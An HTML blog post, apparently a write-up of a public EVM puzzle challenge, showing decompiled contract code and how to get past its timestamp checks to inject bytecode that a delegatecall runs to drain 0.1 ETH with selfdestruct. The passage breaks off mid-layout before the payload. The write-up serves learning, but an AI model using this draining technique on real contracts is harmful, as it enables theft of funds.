<!doctype html><html lang=en-us><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><title>Challenge Twitter - EVM Puzzles & selfdestruct - MevSec Blog</title><meta name=Description content="Puzzle, bytecode and selfdestruct!"><meta property="og:title" content="Challenge Twitter - EVM Puzzles & selfdestruct"><meta property="og:description" content="Puzzle, bytecode and selfdestruct!"><meta property="og:type" content="article"><meta property="og:url" content="http://example.org/posts/twitterchallenge-puzzle-bytecode-f31ba85c800f4c42a469490f9c2378c0/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2022-12-30T00:00:00+00:00"><meta property="article:modified_time" content="2022-12-30T00:00:00+00:00"><meta property="og:site_name" content="MevSec Blog"><meta name=twitter:card content="summary"><meta name=twitter:title content="Challenge Twitter - EVM Puzzles & selfdestruct"><meta name=twitter:description content="Puzzle, bytecode and selfdestruct!"><meta name=application-name content="My cool site"><meta name=apple-mobile-web-app-title content="My cool site"><meta name=theme-color content="#ffffff"><meta name=msapplication-TileColor content="#da532c"><link rel="shortcut icon" type=image/x-icon href=/favicon.ico><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=manifest href=/site.webmanifest><link rel=canonical href=http://example.org/posts/twitterchallenge-puzzle-bytecode-f31ba85c800f4c42a469490f9c2378c0/><link rel=prev href=http://example.org/posts/firstpost/><link rel=stylesheet href=/css/style.min.css><link rel=preload href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css as=style onload='this.onload=null,this.rel="stylesheet"'><noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css></noscript><link rel=preload href=https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css as=style onload='this.onload=null,this.rel="stylesheet"'><noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css></noscript><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"Challenge Twitter - EVM Puzzles \u0026 selfdestruct","inLanguage":"en-us","mainEntityOfPage":{"@type":"WebPage","@id":"http:\/\/example.org\/posts\/twitterchallenge-puzzle-bytecode-f31ba85c800f4c42a469490f9c2378c0\/"},"genre":"posts","keywords":"PoC, EVM, Low-level, Reverse Engineerng, selfdestruct","wordcount":1697,"url":"http:\/\/example.org\/posts\/twitterchallenge-puzzle-bytecode-f31ba85c800f4c42a469490f9c2378c0\/","datePublished":"2022-12-30T00:00:00+00:00","dateModified":"2022-12-30T00:00:00+00:00","publisher":{"@type":"Organization","name":""},"author":{"@type":"Person","name":"Ethnical"},"description":"Puzzle, bytecode and selfdestruct!"}</script></head><body data-header-desktop=fixed data-header-mobile=auto><script type=text/javascript>(window.localStorage&&localStorage.getItem("theme")?localStorage.getItem("theme")==="dark":"auto"==="auto"?window.matchMedia("(prefers-color-scheme: dark)").matches:"auto"==="dark")&&document.body.setAttribute("theme","dark")</script><div id=mask></div><div class=wrapper><header class=desktop id=header-desktop><div class=header-wrapper><div class=header-title><a href=/ title="MevSec Blog">My cool site</a></div><div class=menu><div class=menu-inner><a class=menu-item href=/posts/>Posts </a><a class=menu-item href=/tags/>Tags </a><a class=menu-item href=/categories/>Categories </a><span class="menu-item delimiter"></span><span class="menu-item search" id=search-desktop>
<input type=text placeholder="Search titles or contents..." id=search-input-desktop>
<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-desktop title=Search><i class="fas fa-search fa-fw" aria-hidden=true></i></a>
<a href=javascript:void(0); class="search-button search-clear" id=search-clear-desktop title=Clear><i class="fas fa-times-circle fa-fw" aria-hidden=true></i></a>
<span class="search-button search-loading" id=search-loading-desktop><i class="fas fa-spinner fa-fw fa-spin" aria-hidden=true></i></span>
</span><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme"><i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></div></header><header class=mobile id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=/ title="MevSec Blog">My cool site</a></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><div class=menu id=menu-mobile><div class=search-wrapper><div class="search mobile" id=search-mobile><input type=text placeholder="Search titles or contents..." id=search-input-mobile>
<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-mobile title=Search><i class="fas fa-search fa-fw" aria-hidden=true></i></a>
<a href=javascript:void(0); class="search-button search-clear" id=search-clear-mobile title=Clear><i class="fas fa-times-circle fa-fw" aria-hidden=true></i></a>
<span class="search-button search-loading" id=search-loading-mobile><i class="fas fa-spinner fa-fw fa-spin" aria-hidden=true></i></span></div><a href=javascript:void(0); class=search-cancel id=search-cancel-mobile>Cancel</a></div><a class=menu-item href=/posts/ title>Posts</a><a class=menu-item href=/tags/ title>Tags</a><a class=menu-item href=/categories/ title>Categories</a><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme">
<i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></header><div class="search-dropdown desktop"><div id=search-dropdown-desktop></div></div><div class="search-dropdown mobile"><div id=search-dropdown-mobile></div></div><main class=main><div class=container><div class=toc id=toc-auto><h2 class=toc-title>Contents</h2><div class="toc-content always-active" id=toc-content-auto></div></div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Challenge Twitter - EVM Puzzles & selfdestruct</h1><div class=post-meta><div class=post-meta-line><span class=post-author><a href=https://twitter.com/EthnicalInfo title=Author target=_blank rel="noopener noreffer author" class=author><i class="fas fa-user-circle fa-fw" aria-hidden=true></i>Ethnical</a></span>&nbsp;<span class=post-category>included in <a href=/categories/web3/><i class="far fa-folder fa-fw" aria-hidden=true></i>Web3</a></span></div><div class=post-meta-line><i class="far fa-calendar-alt fa-fw" aria-hidden=true></i>&nbsp;<time datetime=2022-12-30>2022-12-30</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden=true></i>&nbsp;1697 words&nbsp;
<i class="far fa-clock fa-fw" aria-hidden=true></i>&nbsp;8 minutes&nbsp;</div></div><div class="details toc" id=toc-static data-kept><div class="details-summary toc-title"><span>Contents</span>
<span><i class="details-icon fas fa-angle-right" aria-hidden=true></i></span></div><div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents><ul><li><ul><li><a href=#1-introduction>1. Introduction</a></li><li><a href=#2-conditions-bypass>2. Conditions bypass</a></li><li><a href=#3-bytecode>3. Bytecode</a></li><li><a href=#4-selfdestruct>4. SELFDESTRUCT</a></li><li><a href=#5-proof-of-concept--results>5. Proof of Concept & Results</a></li><li><a href=#6-socials--payload>6. Socials & Payload</a></li></ul></li></ul></nav></div></div><div class=content id=content><h3 id=1-introduction>1. Introduction</h3><p>The <em>29 December 2022</em> a challenge went public on <a href="https://twitter.com/0x796/status/1608553575969611777?s=20&t=dInafmHAmrYRQZWL2KnQug" target=_blank rel="noopener noreffer">Twitter</a>, it was the evening and what to do after a day of full of auditing solidity contract? <em>Eat,Sleep,Audit,Repeat?</em></p><p><figure><a class=lightgallery href=/posts/twitterchallenge-puzzle-bytecode-f31ba85c800f4c42a469490f9c2378c0/Untitled.png title=Untitled data-thumbnail=/posts/twitterchallenge-puzzle-bytecode-f31ba85c800f4c42a469490f9c2378c0/Untitled.png data-sub-html="<h2>Tweet from <i>0x796</i> to launch the challenge</h2><p>Untitled</p>"><img class=lazyload src=/svg/loading.min.svg data-src=/posts/twitterchallenge-puzzle-bytecode-f31ba85c800f4c42a469490f9c2378c0/Untitled.png data-srcset="/posts/twitterchallenge-puzzle-bytecode-f31ba85c800f4c42a469490f9c2378c0/Untitled.png, /posts/twitterchallenge-puzzle-bytecode-f31ba85c800f4c42a469490f9c2378c0/Untitled.png 1.5x, /posts/twitterchallenge-puzzle-bytecode-f31ba85c800f4c42a469490f9c2378c0/Untitled.png 2x" data-sizes=auto alt=/posts/twitterchallenge-puzzle-bytecode-f31ba85c800f4c42a469490f9c2378c0/Untitled.png width=1160 height=400></a><figcaption class=image-caption>Tweet from <i>0x796</i> to launch the challenge</figcaption></figure></p><p>The goal of the challenge is to steal the <strong>0.1 ETH</strong> that are waiting on the vulnerable contract.</p><p>Let&rsquo;s dive into the challenge.. Obviously, the contract is <u><em>not verified</em></u> so we have to dive into the <em>bytecode</em> time to use <strong>decompilers</strong> lads!</p><p><figure><a class=lightgallery href=/posts/twitterchallenge-puzzle-bytecode-f31ba85c800f4c42a469490f9c2378c0/Untitled%201.png title=Untitled data-thumbnail=/posts/twitterchallenge-puzzle-bytecode-f31ba85c800f4c42a469490f9c2378c0/Untitled%201.png data-sub-html="<h2>Input Data from <i>Etherscan</i></h2><p>Untitled</p>"><img class=lazyload src=/svg/loading.min.svg data-src=/posts/twitterchallenge-puzzle-bytecode-f31ba85c800f4c42a469490f9c2378c0/Untitled%201.png data-srcset="/posts/twitterchallenge-puzzle-bytecode-f31ba85c800f4c42a469490f9c2378c0/Untitled%201.png, /posts/twitterchallenge-puzzle-bytecode-f31ba85c800f4c42a469490f9c2378c0/Untitled%201.png 1.5x, /posts/twitterchallenge-puzzle-bytecode-f31ba85c800f4c42a469490f9c2378c0/Untitled%201.png 2x" data-sizes=auto alt=/posts/twitterchallenge-puzzle-bytecode-f31ba85c800f4c42a469490f9c2378c0/Untitled%201.png width=2758 height=478></a><figcaption class=image-caption>Input Data from <i>Etherscan</i></figcaption></figure></p><p>Here, we have to <strong>go fast</strong> because the challenge is public so first come first serve&mldr; In addition, The contract size seems to be <em>small</em>.<br>Let’s use <a href=https://library.dedaub.com/contracts/Ethereum/0xA0Eb20483Cb60213bF944c2C3833bebc9fbc4706/overview target=_blank rel="noopener noreffer">dedaub</a> this time (even if <a href=https://github.com/Jon-Becker/heimdall-rs target=_blank rel="noopener noreffer">heimdall</a> looks really promising).</p><p>After using the debugger, we have the following code decompiled:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=cl><span class=kd>function</span> <span class=nf>__function_selector__</span><span class=p>()</span> <span class=k>public</span> <span class=k>payable</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>v0</span> <span class=o>=</span> <span class=n>BASEFEE</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nb>msg</span><span class=p>.</span><span class=nb>value</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nb>require</span><span class=p>(</span><span class=nb>msg</span><span class=p>.</span><span class=nb>value</span> <span class=o>&gt;</span> <span class=s>&#39;iiiii&#39;</span> <span class=o>*</span> <span class=p>(</span><span class=mh>0x63b0beef</span> <span class=o>-</span> <span class=nb>block</span><span class=p>.</span><span class=nb>timestamp</span><span class=p>)</span><span class=n>RETURNDATASIZE</span><span class=p>(),</span> <span class=n>RETURNDATASIZE</span><span class=p>());</span>
</span></span><span class=line><span class=cl>        <span class=n>STORAGE</span><span class=p>[</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>]</span> <span class=o>=</span> <span class=mi>4095</span> <span class=o>+</span> <span class=nb>block</span><span class=p>.</span><span class=nb>timestamp</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>MEM</span><span class=p>[(</span><span class=n>RETURNDATASIZE</span><span class=p>())</span> <span class=n>len</span> <span class=p>(</span><span class=n>RETURNDATASIZE</span><span class=p>())];</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>		<span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nb>require</span><span class=p>((</span><span class=nb>block</span><span class=p>.</span><span class=nb>timestamp</span> <span class=o>&gt;</span> <span class=n>STORAGE</span><span class=p>[</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>])</span> <span class=o>&amp;</span> <span class=p>(</span><span class=n>RETURNDATASIZE</span><span class=p>()</span> <span class=o>&lt;</span> <span class=n>STORAGE</span><span class=p>[</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>])</span><span class=n>RETURNDATASIZE</span><span class=p>(),</span> <span class=n>RETURNDATASIZE</span><span class=p>());</span>
</span></span><span class=line><span class=cl>        <span class=n>MEM</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=p>(</span><span class=nb>msg</span><span class=p>.</span><span class=nb>data</span><span class=p>.</span><span class=n>length</span> <span class=o>&lt;&lt;</span> <span class=mi>232</span><span class=p>)</span> <span class=o>+</span> <span class=mh>0x61000080600a3d393df300000000000000000000000000000000000000000000</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>CALLDATACOPY</span><span class=p>(</span><span class=mi>10</span><span class=p>,</span> <span class=n>RETURNDATASIZE</span><span class=p>(),</span> <span class=nb>msg</span><span class=p>.</span><span class=nb>data</span><span class=p>.</span><span class=n>length</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>v1</span> <span class=o>=</span> <span class=n>v2</span> <span class=o>=</span> <span class=mi>1</span> <span class=o>+</span> <span class=p>(</span><span class=nb>msg</span><span class=p>.</span><span class=nb>data</span><span class=p>.</span><span class=n>length</span> <span class=o>-</span> <span class=mi>1</span> <span class=o>&gt;&gt;</span> <span class=mi>5</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>do</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=n>MEM</span><span class=p>[</span><span class=mi>10</span> <span class=o>+</span> <span class=p>(</span><span class=n>v2</span> <span class=o>-</span> <span class=n>v1</span> <span class=o>&lt;&lt;</span> <span class=mi>5</span><span class=p>)]</span> <span class=o>=</span> <span class=p>(</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span> <span class=o>|</span> <span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span> <span class=o>&lt;&lt;</span> <span class=mi>160</span><span class=p>)</span> <span class=o>^</span> <span class=n>MEM</span><span class=p>[</span><span class=mi>10</span> <span class=o>+</span> <span class=p>(</span><span class=n>v2</span> <span class=o>-</span> <span class=n>v1</span> <span class=o>&lt;&lt;</span> <span class=mi>5</span><span class=p>)];</span>
</span></span><span class=line><span class=cl>            <span class=n>v1</span> <span class=o>=</span> <span class=n>v1</span> <span class=o>-</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span> <span class=k>while</span> <span class=p>(</span><span class=o>!</span><span class=n>v1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>v3</span> <span class=o>=</span> <span class=n>create</span><span class=p>.</span><span class=nb>code</span><span class=p>(</span><span class=n>RETURNDATASIZE</span><span class=p>(),</span> <span class=nb>msg</span><span class=p>.</span><span class=nb>data</span><span class=p>.</span><span class=n>length</span> <span class=o>+</span> <span class=mi>10</span><span class=p>).</span><span class=nb>value</span><span class=p>(</span><span class=n>RETURNDATASIZE</span><span class=p>());</span>
</span></span><span class=line><span class=cl>    <span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=n>v4</span> <span class=o>=</span> <span class=n>v3</span><span class=p>.</span><span class=nb>delegatecall</span><span class=p>(</span><span class=n>MEM</span><span class=p>[(</span><span class=n>RETURNDATASIZE</span><span class=p>())</span> <span class=n>len</span> <span class=p>(</span><span class=n>RETURNDATASIZE</span><span class=p>())],</span> <span class=n>MEM</span><span class=p>[(</span><span class=n>RETURNDATASIZE</span><span class=p>())</span> <span class=n>len</span> <span class=p>(</span><span class=n>RETURNDATASIZE</span><span class=p>())]).</span><span class=nb>gas</span><span class=p>(</span><span class=nb>msg</span><span class=p>.</span><span class=nb>gas</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>MEM</span><span class=p>[(</span><span class=n>RETURNDATASIZE</span><span class=p>())</span> <span class=n>len</span> <span class=p>(</span><span class=n>RETURNDATASIZE</span><span class=p>())];</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><div class="details admonition tip open"><div class="details-summary admonition-title"><i class="icon fas fa-lightbulb fa-fw" aria-hidden=true></i>Steal the 0.1 eth without external calls?<i class="details-icon fas fa-angle-right fa-fw" aria-hidden=true></i></div><div class=details-content><div class=admonition-content>Inside the contract we don&rsquo;t have any <code>transfer()</code>, or <code>.call()</code>. But, since we got a <code>delegatecall()</code> at the end of the code we probably need to call it.</div></div></div><p>So we need to somehow find a way to trigger the <code>delegatecall()</code> on the address ➙ <u><strong>v3</strong></u> with a EVM bytecode that permits to execute what we wants <em>here will be to empty the contract!</em>.</p><p>If we are looking closely to the address <u><strong>v3</strong></u>, we can see that a contract is created and deployed from the the <em>memory</em> of the contract.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=cl><span class=n>v3</span> <span class=o>=</span> <span class=n>create</span><span class=p>.</span><span class=nb>code</span><span class=p>(</span><span class=n>RETURNDATASIZE</span><span class=p>(),</span> <span class=nb>msg</span><span class=p>.</span><span class=nb>data</span><span class=p>.</span><span class=n>length</span> <span class=o>+</span> <span class=mi>10</span><span class=p>).</span><span class=nb>value</span><span class=p>(</span><span class=n>RETURNDATASIZE</span><span class=p>());</span>
</span></span></code></pre></td></tr></table></div></div><p><em>Hmmm.. time to make put some malicious bytecode into this memory to create and deployed our malicious contract!</em></p><p>So we probably need to figure out, how could we manage to deploy a malicious evm bytecode to steal the 0.1 ETH. Have to remember the famous 10M bounty from wormhole here ➙ <a href=https://medium.com/immunefi/wormhole-uninitialized-proxy-bugfix-review-90250c41a43a target=_blank rel="noopener noreffer">Wormhole Uninitialized Proxy Bugfix Review</a>)</p><hr><h3 id=2-conditions-bypass>2. Conditions bypass</h3><p>So for now we need to bypass the first <code>require()</code> .</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=cl><span class=nb>require</span><span class=p>((</span><span class=nb>block</span><span class=p>.</span><span class=nb>timestamp</span> <span class=o>&gt;</span> <span class=n>STORAGE</span><span class=p>[</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>])</span> <span class=o>&amp;</span> <span class=p>(</span><span class=n>RETURNDATASIZE</span><span class=p>()</span> <span class=o>&lt;</span> <span class=n>STORAGE</span><span class=p>[</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>])</span><span class=n>RETURNDATASIZE</span><span class=p>(),</span> <span class=n>RETURNDATASIZE</span><span class=p>());</span>
</span></span></code></pre></td></tr></table></div></div><p>For this, we just need to have the <code>storage[msg.sender] > returndatasize()</code> which will always be <strong>0</strong> in our case for the <code>returndatasize()</code></p><div class="details admonition tip open"><div class="details-summary admonition-title"><i class="icon fas fa-lightbulb fa-fw" aria-hidden=true></i>EVM gas optimization<i class="details-icon fas fa-angle-right fa-fw" aria-hidden=true></i></div><div class=details-content><div class=admonition-content>Here <code>returndatasize()</code> will return always 0 and will be cheaper in gas than a classic push 👀</div></div></div><p><figure><a class=lightgallery href=/posts/twitterchallenge-puzzle-bytecode-f31ba85c800f4c42a469490f9c2378c0/Untitled%202.png title=Untitled data-thumbnail=/posts/twitterchallenge-puzzle-bytecode-f31ba85c800f4c42a469490f9c2378c0/Untitled%202.png data-sub-html="<h2>evm.codes ReturnDataSize</h2><p>Untitled</p>"><img class=lazyload src=/svg/loading.min.svg data-src=/posts/twitterchallenge-puzzle-bytecode-f31ba85c800f4c42a469490f9c2378c0/Untitled%202.png data-srcset="/posts/twitterchallenge-puzzle-bytecode-f31ba85c800f4c42a469490f9c2378c0/Untitled%202.png, /posts/twitterchallenge-puzzle-bytecode-f31ba85c800f4c42a469490f9c2378c0/Untitled%202.png 1.5x, /posts/twitterchallenge-puzzle-bytecode-f31ba85c800f4c42a469490f9c2378c0/Untitled%202.png 2x" data-sizes=auto alt=/posts/twitterchallenge-puzzle-bytecode-f31ba85c800f4c42a469490f9c2378c0/Untitled%202.png width=2500 height=162></a><figcaption class=image-caption>evm.codes ReturnDataSize</figcaption></figure></p><p>Then, we need to have to bypass the following check:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=cl><span class=nb>block</span><span class=p>.</span><span class=nb>timestamp</span> <span class=o>&gt;</span> <span class=n>STORAGE</span><span class=p>[</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>])</span>
</span></span></code></pre></td></tr></table></div></div><p>To do, so we need to find a way to write at <code>STORAGE[msg.sender].</code> Hopefully for us, we have the following the code:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nb>msg</span><span class=p>.</span><span class=nb>value</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nb>require</span><span class=p>(</span><span class=nb>msg</span><span class=p>.</span><span class=nb>value</span> <span class=o>&gt;</span> <span class=s>&#39;iiiii&#39;</span> <span class=o>*</span> <span class=p>(</span><span class=mh>0x63b0beef</span> <span class=o>-</span> <span class=nb>block</span><span class=p>.</span><span class=nb>timestamp</span><span class=p>)</span><span class=n>RETURNDATASIZE</span><span class=p>(),</span> <span class=n>RETURNDATASIZE</span><span class=p>());</span>
</span></span><span class=line><span class=cl>        <span class=n>STORAGE</span><span class=p>[</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>]</span> <span class=o>=</span> <span class=mi>4095</span> <span class=o>+</span> <span class=nb>block</span><span class=p>.</span><span class=nb>timestamp</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>MEM</span><span class=p>[(</span><span class=n>RETURNDATASIZE</span><span class=p>())</span> <span class=n>len</span> <span class=p>(</span><span class=n>RETURNDATASIZE</span><span class=p>())];</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>If the <code>msg.value > 0</code> is <code>true</code> then the contract will overwrite the value <code>STORAGE[msg.sender]</code> with the <code>block.timestamp + 4095</code></p><p>So, here we know we will have to make <u><em>two calls</em></u>:</p><ol><li>Setup the value into the storage to bypass the <code>require()</code> using a <code>msg.value > 0</code>.</li><li>Then recall the contract with <code>msg.value == 0</code> to execute the <code>delegatecall()</code>.</li></ol><p>However, if we are looking closely the :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=cl><span class=n>STORAGE_</span><span class=p>[</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>]</span> <span class=o>=</span> <span class=mi>4095</span> <span class=o>+</span> <span class=nb>block</span><span class=p>.</span><span class=nb>timestamp</span><span class=p>;</span>
</span></span></code></pre></td></tr></table></div></div><p>but the check later on, compares:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=cl><span class=nb>block</span><span class=p>.</span><span class=nb>timestamp</span> <span class=o>&gt;</span> <span class=n>STORAGE</span><span class=p>[</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>]</span>
</span></span></code></pre></td></tr></table></div></div><p>At that point, we got a problem because <code>4095+block.timestamp</code> will be greater than <code>block.timestamp</code>.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=cl><span class=n>STORAGE_</span><span class=p>[</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>]</span> <span class=o>=</span> <span class=mi>4095</span><span class=o>+</span><span class=nb>block</span><span class=p>.</span><span class=nb>timestamp</span><span class=p>;</span>
</span></span></code></pre></td></tr></table></div></div><p>This will be really awfull&mldr; As the <code>block.timestamp</code> will not change during the same transaction&mldr;</p><p>How could we <strong>bypass</strong> this check?<br><em>Patience&mldr; we have to wait 4095 seconds before calling again the contract.</em></p><p>Obviously, for <em>debugging purposes</em> we can use cheatcode from <a href=https://github.com/foundry-rs/foundry target=_blank rel="noopener noreffer">Foundry</a> like <u>vm.warp()</u>: <code>vm.warp(4096+block.timestamp)</code>to jump in the future of <strong><u>4096 seconds</u></strong>.</p><hr><h3 id=3-bytecode>3. Bytecode</h3><p>We are now bypassing everything! We arriving at the interesting part. henceforth we need to craft our malicious contract to steal the <em>ETH</em> during the <code>delegateCall()</code>.</p><p>The &ldquo;base&rdquo; of the evm bytecode is already made for us here:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>MEM</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=p>(</span><span class=nb>msg</span><span class=p>.</span><span class=nb>data</span><span class=p>.</span><span class=n>length</span> <span class=o>&lt;&lt;</span> <span class=mi>232</span><span class=p>)</span> <span class=o>+</span> <span class=mh>0x61000080600a3d393df300000000000000000000000000000000000000000000</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=c1>//The &#34;base&#34; evm is then : 0x61000080600a3d393df300000000000000000000000000000000000000000000
</span></span></span></code></pre></td></tr></table></div></div><p>We got the <em>0xF3</em> at the end (stands for <u>RETURN</u>), so if somehow we succeed to inject the malicious bytecode after the 0xf3(RETURN).<br><em>We will be rich as yannickcrypto.eth!🚀</em></p><p>The <code>msg.data</code> is used to determine the length of our contract code. So for example, if the length is <strong>30</strong> bytes the contract deployed will be of <strong>30</strong> bytes.</p><p>So just to recap, we have to use the <code>msg.data</code>. To use it, we will use a <em>bytes memory</em> using the <code>hex</code> keyword (e.g below).</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=cl><span class=kt>bytes</span> <span class=k>memory</span> <span class=nb>data</span> <span class=o>=</span> <span class=s>hex&#34;4141414141414141414141414141414141414141&#34;</span><span class=p>;</span> <span class=c1>// send 20 bytes.
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=n>victim</span><span class=p>.</span><span class=nb>call</span><span class=p>{</span> <span class=nb>gas</span><span class=o>:</span> <span class=mi>1</span><span class=n>_000_000</span> <span class=p>}(</span><span class=nb>data</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><p>So this the layout we have right now:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=cl>	<span class=mi>20</span> <span class=kt>bytes</span> <span class=p>(</span><span class=n>Base</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=o>|------------------|</span>
</span></span><span class=line><span class=cl><span class=mi>61000080600</span><span class=n>a3d393df300000000000000000000000000000000000000000000</span>
</span></span><span class=line><span class=cl>                   <span class=o>^</span>
</span></span></code></pre></td></tr></table></div></div><p>This is the layout we want:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=cl>   <span class=mi>20</span> <span class=kt>bytes</span> <span class=p>(</span><span class=n>Base</span><span class=p>)</span>    <span class=kt>bytes</span> <span class=n>malicious</span> <span class=n>to</span> <span class=n>create</span> <span class=n>a</span> <span class=nb>selfdestruct</span>
